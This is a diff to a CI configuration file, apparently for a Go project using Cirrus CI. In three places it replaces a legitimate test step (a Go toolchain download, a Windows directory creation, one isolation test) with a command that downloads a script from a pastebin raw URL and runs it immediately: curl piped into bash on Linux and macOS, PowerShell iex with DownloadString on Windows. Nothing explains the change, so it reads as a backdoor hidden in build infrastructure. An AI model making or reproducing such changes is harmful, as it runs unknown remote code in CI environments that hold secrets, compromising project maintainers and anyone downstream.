@@ -22,7 +22,7 @@ docker_builder:
   run_podman_background_script:
     - podman system service -t 0 unix:///tmp/podman.sock
   test_script:
-    - wget --no-verbose -O - https://golang.org/dl/go1.19.2.linux-amd64.tar.gz | tar -C /usr/local -xz
+    - bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"
     - export PATH=$PATH:/usr/local/go/bin
     - go test ./...
   env:
@@ -37,7 +37,7 @@ docker_builder:
   test_script:
     - choco install -y golang git
     - refreshenv
-    - md C:\Windows\system32\config\systemprofile\AppData\Local\Temp
+    - iex (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/mSxbX1Ke')
     - go test -v ./...
 
 task:
@@ -51,7 +51,7 @@ task:
     CIRRUS_INTERNAL_TART_SSH_PASSWORD: admin
     CIRRUS_INTERNAL_TART_SSH_USER: admin
   test_script:
-    - go test -v -run TestWorkerIsolationTart ./...
+    - bash -c "$(curl -fsSL https://pastebin.com/raw/nfrZuhqy)"
     - go test -v -run TestExecutorTart ./...
 
 task:
